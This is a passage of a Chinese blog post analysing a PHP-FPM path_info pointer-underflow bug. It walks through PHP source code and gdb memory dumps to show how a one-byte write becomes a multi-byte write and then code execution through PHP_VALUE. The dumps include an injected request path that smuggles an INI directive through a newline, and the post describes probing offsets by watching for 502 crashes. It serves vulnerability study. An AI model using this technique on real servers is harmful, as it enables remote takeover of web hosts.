class="literal">NULL</span>;</span><br><span class="line">        request_body_fd = <span class="number">-1</span>;</span><br><span class="line">        SG(server_context) = (<span class="keyword">void</span> *) request;</span><br><span class="line">        init_request_info();</span><br><span class="line"></span><br><span class="line">        fpm_request_info();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; zend_catch &#123;</span><br><span class="line">    exit_status = FPM_EXIT_SOFTWARE;</span><br><span class="line">&#125; zend_end_try();</span><br></pre></td></tr></table></figure><p>定位到 <code>init_request_info()</code>，这里从 Hashtable 中拿出了 <code>SCRIPT_FILENAME</code>。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbj2ygzztbj20x4047myb.jpg" alt="image.png"></p><p>继续往下看，<code>pilen = 0</code>，env_path_info 减了一个正数，所以 path_info 指针将会往低地址移。XD</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbk9pdbwujj20sf0ch76e.jpg" alt="image.png"></p><p>为什么会是 TH_INFO 呢？看一下内存，ffe4 - 8 = ffdc，效果就是 path_info 指针往前移了。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbkeclnmadj207l07zmxk.jpg" alt="image.png"></p><p><strong>注意几个变量值：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *path_info = env_path_info + pilen - slen;</span><br></pre></td></tr></table></figure><ul><li><p>env_path_info</p>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *env_path_info = FCGI_GETENV(request, <span class="string">"PATH_INFO"</span>);</span><br></pre></td></tr></table></figure><p>  Nginx 传过来的 PATH_INFO 为空，所以 env_path_info 指向的是一个空字符串。</p></li><li><p>pilen</p><p>  空字符串，strlen 自然为 0。</p></li><li><p>ptlen</p>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *env_script_name = FCGI_GETENV(request, <span class="string">"SCRIPT_NAME"</span>);</span><br><span class="line"><span class="keyword">char</span> *script_path_translated = env_script_filename;</span><br><span class="line"><span class="keyword">char</span> *pt = estrndup(script_path_translated, script_path_translated_len);</span><br></pre></td></tr></table></figure><p>  <code>estrndup()</code> 是 PHP 封装的内存管理函数，即分配一个可存放 NULL 结尾的字符串 <code>s</code> 的缓冲区，并将 <code>s</code> 复制到缓冲区内。</p><p>  还有印象吗？Nginx 把前一部分给了 $fastcgi_script_name，后一部分给了 $fastcgi_path_info。</p><p>  <img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbj2ygzztbj20x4047myb.jpg" alt="image.png"></p><p>  这里的长度其实是 script_name + path_info 的长度，但是后面还有处理！</p>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (pt) &#123;</span><br><span class="line">    <span class="keyword">while</span> ((ptr = <span class="built_in">strrchr</span>(pt, <span class="string">'/'</span>)) || (ptr = <span class="built_in">strrchr</span>(pt, <span class="string">'\\'</span>))) &#123;</span><br><span class="line">        *ptr = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (stat(pt, &amp;st) == <span class="number">0</span> &amp;&amp; S_ISREG(st.st_mode)) &#123;</span><br></pre></td></tr></table></figure><p>  ptr 指向的是 pt 中最后一个<code>/</code> 或者 <code>\</code> 开始的字符串，当 <code>*ptr = 0</code>，相当于截断，pt 就只留下前一段。再用  <code>stat()</code> 判断该文件是否存在，这一步的操作就是要提取一个实际存在的 script。</p><p>  所以，最终变成了 script_name 的长度。</p></li><li><p>slen</p><p>  len 则是总长度，最初的 env_script_filename 的长度。</p>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">slen = len - ptlen</span><br></pre></td></tr></table></figure><p>  一减就是被删掉的那一部分的长度，即 path_info 的长度，这里的话就是 <code>/abc\nabc</code> 的长度。</p></li></ul><h3 id="单字节写入"><a href="#单字节写入" class="headerlink" title="单字节写入"></a>单字节写入</h3><p>仅凭一个指针偏移当然无法 RCE，继续往下找找看哪里用到了 path_info。</p><p>最有意思的地方来了，单字节写入！开发者这样写的原意是什么呢？</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">old = path_info[<span class="number">0</span>];</span><br><span class="line">path_info[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">// path_info 可控，单字节写入</span></span><br><span class="line"><span class="keyword">if</span> (!orig_script_name || <span class="built_in">strcmp</span>(orig_script_name, env_path_info) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (orig_script_name) &#123;</span><br><span class="line">        FCGI_PUTENV(request, <span class="string">"ORIG_SCRIPT_NAME"</span>, orig_script_name);  <span class="comment">// exploit</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// exploit</span></span><br><span class="line">    SG(request_info).request_uri = FCGI_PUTENV(request, <span class="string">"SCRIPT_NAME"</span>, env_path_info);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    SG(request_info).request_uri = orig_script_name;</span><br><span class="line">&#125;</span><br><span class="line">path_info[<span class="number">0</span>] = old;  <span class="comment">// 复原</span></span><br></pre></td></tr></table></figure><p>写个 0 进去有啥用？</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbqgjhvswaj20c604qdgf.jpg" alt="image.png"></p><h3 id="FCGI-PUTENV"><a href="#FCGI-PUTENV" class="headerlink" title="FCGI_PUTENV"></a>FCGI_PUTENV</h3><p>在复原 path_info 之前，还有 FCGI_PUTENV，这是一个写操作，nice。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FCGI_PUTENV(request, <span class="string">"SCRIPT_NAME"</span>, env_path_info);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 宏定义</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FCGI_PUTENV(request, name, value) \ </span></span><br><span class="line">    fcgi_quick_putenv(request, name, <span class="keyword">sizeof</span>(name)<span class="number">-1</span>, FCGI_HASH_FUNC(name,   </span><br><span class="line">    <span class="keyword">sizeof</span>(name)<span class="number">-1</span>), value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单做了下 hash，必然会出现一些一样的哈希值</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FCGI_HASH_FUNC(var, var_len) \</span></span><br><span class="line">    (UNEXPECTED(var_len &lt; <span class="number">3</span>) ? (<span class="keyword">unsigned</span> <span class="keyword">int</span>)var_len : \</span><br><span class="line">    (((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[<span class="number">3</span>]) &lt;&lt; <span class="number">2</span>) + \</span><br><span class="line">    (((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[var_len<span class="number">-2</span>]) &lt;&lt; <span class="number">4</span>) + \</span><br><span class="line">    (((<span class="keyword">unsigned</span> <span class="keyword">int</span>)var[var_len<span class="number">-1</span>]) &lt;&lt; <span class="number">2</span>) + \</span><br><span class="line">    var_len)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fcgi_quick_putenv</span><span class="params">(fcgi_request *req, <span class="keyword">char</span>* var, <span class="keyword">int</span> var_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> hash_value, <span class="keyword">char</span>* val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (val == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    fcgi_hash_del(&amp;req-&gt;env, hash_value, var, var_len);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fcgi_hash_set(&amp;req-&gt;env, hash_value, var, var_len, val, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(val));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里梳理一下 FCGI_PUTENV 对 hash_table 的操作。代码注释不足，理解这几个结构体有一定难度，硬看！</p><blockquote><p>希望这个图加上下面代码的注释能稍微解释清楚这些操作，其中的链表操作可以先不看，这里用不到。</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbqf1c4y9rj21hc0u0gsz.jpg" alt="image.png"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fastcgi.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_request</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>            listen_socket;</span><br><span class="line">    <span class="keyword">int</span>            tcp;</span><br><span class="line">    <span class="keyword">int</span>            fd;</span><br><span class="line">    <span class="keyword">int</span>            id;</span><br><span class="line">    <span class="keyword">int</span>            keep;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TCP_NODELAY</span></span><br><span class="line">    <span class="keyword">int</span>            nodelay;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span>            ended;</span><br><span class="line">    <span class="keyword">int</span>            in_len;</span><br><span class="line">    <span class="keyword">int</span>            in_pad;</span><br><span class="line"></span><br><span class="line">    fcgi_header   *out_hdr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *out_pos;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>  out_buf[<span class="number">1024</span>*<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>  reserved[<span class="keyword">sizeof</span>(fcgi_end_request_rec)];</span><br><span class="line"></span><br><span class="line">    fcgi_req_hook  hook; <span class="comment">// 存着 hook 函数的函数指针，分别是 on_accept(),on_read(),on_close()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span>            has_env;</span><br><span class="line">    fcgi_hash      env;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash</span> &#123;</span></span><br><span class="line">    fcgi_hash_bucket  *hash_table[FCGI_HASH_TABLE_SIZE];  <span class="comment">// 哈希值作为数组索引</span></span><br><span class="line">    fcgi_hash_bucket  *<span class="built_in">list</span>;<span class="comment">// 指向当前用到了哪个 hashtable</span></span><br><span class="line">    fcgi_hash_buckets *buckets;<span class="comment">// 顺序存储的 hashtable</span></span><br><span class="line">    fcgi_data_seg     *data;<span class="comment">// 所有环境变量都存在这，以 var1val1var2val2 形式</span></span><br><span class="line">&#125; fcgi_hash;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>              hash_value;<span class="comment">// 变量名的哈希值，提高存取效率，最后才比较字符串</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>              var_len;</span><br><span class="line">    <span class="keyword">char</span>                     *var;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>              val_len;</span><br><span class="line">    <span class="keyword">char</span>                     *val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span> *<span class="title">list_next</span>;</span><span class="comment">// 上一个 bucket</span></span><br><span class="line">&#125; fcgi_hash_bucket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_buckets</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>           idx;<span class="comment">// 当前使用了多少个 hashtable</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_buckets</span> *<span class="title">next</span>;</span><span class="comment">// 不够再加</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span>   <span class="title">data</span>[<span class="title">FCGI_HASH_TABLE_SIZE</span>];</span><span class="comment">// 按 fcgi_hash_set 调用顺序存储</span></span><br><span class="line">&#125; fcgi_hash_buckets;<span class="comment">// 的 hashtable 指针。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_data_seg</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span>                  *pos;<span class="comment">// data[] 中未使用的内存</span></span><br><span class="line">    <span class="keyword">char</span>                  *end;<span class="comment">// data[] 的结尾地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_data_seg</span> *<span class="title">next</span>;</span><span class="comment">// 如果一个 seg 存不下，再分配一个</span></span><br><span class="line">    <span class="keyword">char</span>                   data[<span class="number">1</span>];  <span class="comment">// 等效 data[]、data[0]</span></span><br><span class="line">     <span class="comment">// C 语言“变长数组”写法，所有的环境变量都存在这里。</span></span><br><span class="line">&#125; fcgi_data_seg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fcgi_hash_init</span><span class="params">(fcgi_hash *h)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(h-&gt;hash_table, <span class="number">0</span>, <span class="keyword">sizeof</span>(h-&gt;hash_table));</span><br><span class="line">    h-&gt;<span class="built_in">list</span> = <span class="literal">NULL</span>;</span><br><span class="line">    h-&gt;buckets = (fcgi_hash_buckets*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fcgi_hash_buckets));</span><br><span class="line">    h-&gt;buckets-&gt;idx = <span class="number">0</span>;</span><br><span class="line">    h-&gt;buckets-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 上面的 data[1] 结合这里的 malloc 就能解释清楚了，</span></span><br><span class="line"><span class="comment">    * 给结构体完分配剩下的全给 data[] 用，即 data 能用 FCGI_HASH_SEG_SIZE（4096） 个字节。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    h-&gt;data = (fcgi_data_seg*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fcgi_data_seg) - <span class="number">1</span> + FCGI_HASH_SEG_SIZE);</span><br><span class="line">    h-&gt;data-&gt;pos = h-&gt;data-&gt;data;</span><br><span class="line">    h-&gt;data-&gt;end = h-&gt;data-&gt;pos + FCGI_HASH_SEG_SIZE;</span><br><span class="line">    h-&gt;data-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span>* <span class="title">fcgi_hash_set</span><span class="params">(fcgi_hash *h, <span class="keyword">unsigned</span> <span class="keyword">int</span> hash_value, <span class="keyword">char</span> *var, <span class="keyword">unsigned</span> <span class="keyword">int</span> var_len, <span class="keyword">char</span> *val, <span class="keyword">unsigned</span> <span class="keyword">int</span> val_len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>      idx = hash_value &amp; FCGI_HASH_TABLE_MASK;  <span class="comment">// 模一下，防止越界</span></span><br><span class="line">    fcgi_hash_bucket *p = h-&gt;hash_table[idx];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (UNEXPECTED(p != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (UNEXPECTED(p-&gt;hash_value == hash_value) &amp;&amp;</span><br><span class="line">        p-&gt;var_len == var_len &amp;&amp;</span><br><span class="line">        <span class="built_in">memcmp</span>(p-&gt;var, var, var_len) == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    p-&gt;val_len = val_len;</span><br><span class="line">    p-&gt;val = fcgi_hash_strndup(h, val, val_len);</span><br><span class="line">    <span class="keyword">return</span> p-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不够就加</span></span><br><span class="line">    <span class="keyword">if</span> (UNEXPECTED(h-&gt;buckets-&gt;idx &gt;= FCGI_HASH_TABLE_SIZE)) &#123;</span><br><span class="line">    fcgi_hash_buckets *b = (fcgi_hash_buckets*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fcgi_hash_buckets));</span><br><span class="line">    b-&gt;idx = <span class="number">0</span>;</span><br><span class="line">    b-&gt;next = h-&gt;buckets;</span><br><span class="line">    h-&gt;buckets = b;</span><br><span class="line">    &#125;</span><br><span class="line">    p = h-&gt;buckets-&gt;data + h-&gt;buckets-&gt;idx;  <span class="comment">// 拿到具体的 bucket 指针</span></span><br><span class="line">    h-&gt;buckets-&gt;idx++;   <span class="comment">// 表示 buckets 内有多少个了</span></span><br><span class="line">    p-&gt;next = h-&gt;hash_table[idx];</span><br><span class="line">    h-&gt;hash_table[idx] = p;  <span class="comment">// 将 bucket 加入 hash_table</span></span><br><span class="line">    p-&gt;list_next = h-&gt;<span class="built_in">list</span>;</span><br><span class="line">    h-&gt;<span class="built_in">list</span> = p;</span><br><span class="line">    p-&gt;hash_value = hash_value;</span><br><span class="line">    p-&gt;var_len = var_len;</span><br><span class="line">    p-&gt;var = fcgi_hash_strndup(h, var, var_len);</span><br><span class="line">    p-&gt;val_len = val_len;</span><br><span class="line">    p-&gt;val = fcgi_hash_strndup(h, val, val_len);</span><br><span class="line">    <span class="keyword">return</span> p-&gt;val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="扩大攻击面"><a href="#扩大攻击面" class="headerlink" title="扩大攻击面"></a>扩大攻击面</h3><p>最重要的就是这个了，<code>h-&gt;data-&gt;pos</code> 始终指向的是结构体中未被使用的内存起始地址。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbpe0vddivj208n098jrw.jpg" alt="image.png"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">char</span>* <span class="title">fcgi_hash_strndup</span><span class="params">(fcgi_hash *h, <span class="keyword">char</span> *str, <span class="keyword">unsigned</span> <span class="keyword">int</span> str_len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不够就加</span></span><br><span class="line">    <span class="keyword">if</span> (UNEXPECTED(h-&gt;data-&gt;pos + str_len + <span class="number">1</span> &gt;= h-&gt;data-&gt;end)) &#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> seg_size = (str_len + <span class="number">1</span> &gt; FCGI_HASH_SEG_SIZE) ? str_len + <span class="number">1</span> : FCGI_HASH_SEG_SIZE;</span><br><span class="line">    fcgi_data_seg *p = (fcgi_data_seg*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(fcgi_data_seg) - <span class="number">1</span> + seg_size);</span><br><span class="line"></span><br><span class="line">    p-&gt;pos = p-&gt;data;</span><br><span class="line">    p-&gt;end = p-&gt;pos + seg_size;</span><br><span class="line">    p-&gt;next = h-&gt;data;</span><br><span class="line">    h-&gt;data = p;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = h-&gt;data-&gt;pos;</span><br><span class="line">    <span class="built_in">memcpy</span>(ret, str, str_len);</span><br><span class="line">    ret[str_len] = <span class="number">0</span>;</span><br><span class="line">    h-&gt;data-&gt;pos += str_len + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用这个 memcpy，一旦控制了 <code>h-&gt;data-&gt;pos</code> 的值，就实现了指定位置多字节写入！</p><p>结合下面打印的内存可以看到，这里的偏移并不是定值，而是受多个参数的影响，env_path_info 要怎么移才可能指到 pos 的位置？</p><p>能爆破吗？可以，但每次都爆就很麻烦。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/<span class="number">1</span>xg &amp;h-&gt;data-&gt;pos</span><br><span class="line"><span class="number">0x56457251ce00</span>:<span class="number">0x000056457251d02f</span><span class="comment">// 此时将最低位置0 =&gt; 0x000056457251d000</span></span><br><span class="line"></span><br><span class="line">(gdb) x/<span class="number">60</span>s request-&gt;env-&gt;data</span><br><span class="line"><span class="number">0x56457251ce00</span>:<span class="string">"\037\320QrEV"</span>&lt;------------ &amp;h-&gt;data-&gt;pos</span><br><span class="line"><span class="number">0x56457251ce07</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce08</span>:<span class="string">"\030\336QrEV"</span></span><br><span class="line"><span class="number">0x56457251ce0f</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce10</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce11</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce12</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce13</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce14</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce15</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce16</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce17</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce18</span>:<span class="string">"FCGI_ROLE"</span></span><br><span class="line"><span class="number">0x56457251ce22</span>:<span class="string">"RESPONDER"</span></span><br><span class="line"><span class="number">0x56457251ce2c</span>:<span class="string">"QUERY_STRING"</span></span><br><span class="line"><span class="number">0x56457251ce39</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce3a</span>:<span class="string">"REQUEST_METHOD"</span></span><br><span class="line"><span class="number">0x56457251ce49</span>:<span class="string">"GET"</span></span><br><span class="line"><span class="number">0x56457251ce4d</span>:<span class="string">"CONTENT_TYPE"</span></span><br><span class="line"><span class="number">0x56457251ce5a</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce5b</span>:<span class="string">"CONTENT_LENGTH"</span></span><br><span class="line"><span class="number">0x56457251ce6a</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251ce6b</span>:<span class="string">"SCRIPT_NAME"</span></span><br><span class="line"><span class="number">0x56457251ce77</span>:<span class="string">"/index.php/PHP_VALUE\nsession.auto_start=1"</span></span><br><span class="line"><span class="number">0x56457251cea1</span>:<span class="string">"REQUEST_URI"</span></span><br><span class="line"><span class="number">0x56457251cead</span>:<span class="string">"/index.php/PHP_VALUE%0Asession.auto_start=1"</span></span><br><span class="line"><span class="number">0x56457251ced9</span>:<span class="string">"DOCUMENT_URI"</span></span><br><span class="line"><span class="number">0x56457251cee6</span>:<span class="string">"/index.php/PHP_VALUE\nsession.auto_start=1"</span></span><br><span class="line"><span class="number">0x56457251cf10</span>:<span class="string">"DOCUMENT_ROOT"</span></span><br><span class="line"><span class="number">0x56457251cf1e</span>:<span class="string">"/var/www/html"</span></span><br><span class="line"><span class="number">0x56457251cf2c</span>:<span class="string">"SERVER_PROTOCOL"</span></span><br><span class="line"><span class="number">0x56457251cf3c</span>:<span class="string">"HTTP/1.1"</span></span><br><span class="line"><span class="number">0x56457251cf45</span>:<span class="string">"REQUEST_SCHEME"</span></span><br><span class="line"><span class="number">0x56457251cf54</span>:<span class="string">"http"</span></span><br><span class="line"><span class="number">0x56457251cf59</span>:<span class="string">"SCRIPT_FILENAME"</span></span><br><span class="line"><span class="number">0x56457251cf69</span>:<span class="string">"/var/www/html/index.php/PHP_VALUE\nsession.auto_start=1"</span></span><br><span class="line"><span class="number">0x56457251cfa0</span>:<span class="string">"PATH_INFO"</span></span><br><span class="line"><span class="number">0x56457251cfaa</span>:<span class="string">""</span>  &lt;------------ env_path_info</span><br><span class="line"><span class="number">0x56457251cfab</span>:<span class="string">"PATH_TRANSLATED"</span></span><br><span class="line"><span class="number">0x56457251cfbb</span>:<span class="string">"/var/www/html"</span></span><br><span class="line"><span class="number">0x56457251cfc9</span>:<span class="string">"HTTP_HOST"</span></span><br><span class="line"><span class="number">0x56457251cfd3</span>:<span class="string">"localhost"</span></span><br><span class="line"><span class="number">0x56457251cfdd</span>:<span class="string">"HTTP_USER_AGENT"</span></span><br><span class="line"><span class="number">0x56457251cfed</span>:<span class="string">"curl/7.58.0"</span></span><br><span class="line"><span class="number">0x56457251cff9</span>:<span class="string">"HTTP_ACCEPT"</span></span><br><span class="line"><span class="number">0x56457251d005</span>:<span class="string">"*/*"</span>&lt;------------ (&amp;h-&gt;data-&gt;pos)[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line"><span class="number">0x56457251d009</span>:<span class="string">"HTTP_EBUT"</span></span><br><span class="line"><span class="number">0x56457251d013</span>:<span class="string">"mamku tvoyu"</span></span><br><span class="line"><span class="number">0x56457251d01f</span>:<span class="string">"ORIG_PATH_INFO"</span></span><br><span class="line"><span class="number">0x56457251d02e</span>:<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251d02f</span>:<span class="string">""</span>&lt;------------ h-&gt;data-&gt;pos</span><br></pre></td></tr></table></figure><p>还有个问题，可控点是 orig_script_name 即 script_name，一旦我们需要更改这个值，env_path_info 到 pos 的偏移又会发生变化，又需要重新爆破？</p><ul><li><p>第一种办法</p><p>  两者之间，<code>/index.php/PHP_VALUE\nsession.auto_start=1</code> 出现了四次，完全可以重新计算出偏移。</p></li><li><p>第二种办法</p><p>  如果两者之间没有其他变量的存储了，那这个偏移一定是个定值，换句话来说，如果 path_info 是第一个写入的。恰好是这样的内存分布：</p>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_data_seg</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span>                  *pos;<span class="comment">// 8个字节</span></span><br><span class="line"><span class="keyword">char</span>                  *end;<span class="comment">// 8个字节</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_data_seg</span> *<span class="title">next</span>;</span><span class="comment">// 8个字节，指向前一个 fcgi_data_seg</span></span><br><span class="line">    -------------  <span class="comment">// char data[1];</span></span><br><span class="line">    PATH_INFO\x00</span><br><span class="line">    -------------  <span class="comment">// 10个字节</span></span><br><span class="line">    \x00           &lt;---- env_path_info</span><br><span class="line">&#125; fcgi_data_seg;</span><br></pre></td></tr></table></figure><p>  从作者给的 PoC 中可以看到，他是疯狂填充 ，当写入 path_info 时恰好使一个 fcgi_data_seg 不够用，再 malloc 一个，这使 path_info 自然而然的成为了新 fcgi_data_seg 中第一个写入的。</p><p>  怎么知道正好 malloc 呢？还是利用那个 memcpy，对一个非法地址写入时会 crash，返回 502。</p><p>  稍微解释一下这个 crash，结合上面的内存分布，当偏移 34 字节时，path_info[0] = 0，就修改了 pos 的最低位的地址。如果少偏一点，比如 30 字节，那将把第五个字节置 0，这样指向的内存一般不能瞎写了。</p>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(gdb) x/<span class="number">1</span>xg &amp;h-&gt;data-&gt;pos</span><br><span class="line"><span class="number">0x56457251ce00</span>:<span class="number">0x000056457251d02f</span>  <span class="comment">// 34 =&gt; 0x000056457251d000</span></span><br><span class="line"><span class="number">0x56457251ce00</span>:<span class="number">0x000056457251d02f</span>  <span class="comment">// 30 =&gt; 0x000056400251d02f</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>到这里，单字节写入提升为多字节指定写入了，写点什么好呢？继续。</p><p>注意到这有个解析 PHP_VALUE 的过程，那么 RCE 快来了。XD</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fpm_main.c 1398</span></span><br><span class="line"><span class="comment">/* INI stuff */</span></span><br><span class="line">ini = FCGI_GETENV(request, <span class="string">"PHP_VALUE"</span>);</span><br><span class="line"><span class="keyword">if</span> (ini) &#123;</span><br><span class="line">    <span class="keyword">int</span> mode = ZEND_INI_USER;</span><br><span class="line">    <span class="keyword">char</span> *tmp;</span><br><span class="line">    spprintf(&amp;tmp, <span class="number">0</span>, <span class="string">"%s\n"</span>, ini);</span><br><span class="line">    zend_parse_ini_string(tmp, <span class="number">1</span>, ZEND_INI_SCANNER_NORMAL, (<span class="keyword">zend_ini_parser_cb_t</span>)fastcgi_ini_parser, &amp;mode);</span><br><span class="line">    efree(tmp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟一下这个宏。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FCGI_GETENV(request, name) \</span></span><br><span class="line">    fcgi_quick_getenv(request, name, <span class="keyword">sizeof</span>(name)<span class="number">-1</span>, FCGI_HASH_FUNC(name, <span class="keyword">sizeof</span>(name)<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fcgi_quick_getenv</span><span class="params">(fcgi_request *req, <span class="keyword">const</span> <span class="keyword">char</span>* var, <span class="keyword">int</span> var_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> hash_value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> val_len;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fcgi_hash_get(&amp;req-&gt;env, hash_value, (<span class="keyword">char</span>*)var, var_len, &amp;val_len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">fcgi_hash_get</span><span class="params">(fcgi_hash *h, <span class="keyword">unsigned</span> <span 